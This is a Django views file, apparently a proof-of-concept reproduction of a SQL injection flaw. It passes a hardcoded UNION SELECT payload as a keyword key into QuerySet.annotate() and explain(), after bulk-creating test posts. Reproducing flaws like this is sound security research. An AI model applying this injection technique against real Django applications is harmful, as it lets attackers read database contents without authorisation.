from django.shortcuts import render
from django.http import HttpResponse
from django.db.models import Count
from django.utils import timezone
from .models import Post

import datetime
import os

# Create your views here.
def index(request):
    posts = [] 
    payload = 'post.title" FROM "polls_post" UNION SELECT "10000,", sqlite_version(), "content", "published_date", "10" -- ';

    for i in range(30):
        posts.append(Post(title=f"title ${i}", content=f"test {i}", published_date=timezone.now()))

    Post.objects.bulk_create(posts)

    if not payload == "":
        pubs = Post.objects.annotate(**{payload: Count("title")})
        pubs2 = Post.objects.filter(title="First Post").explain(**{payload: True})

        for pubs in pubs:
            print(pubs.title)

        for pubs2 in pubs2:
            print(pubs2)

    return HttpResponse("Hello, world. You're at the polls index.")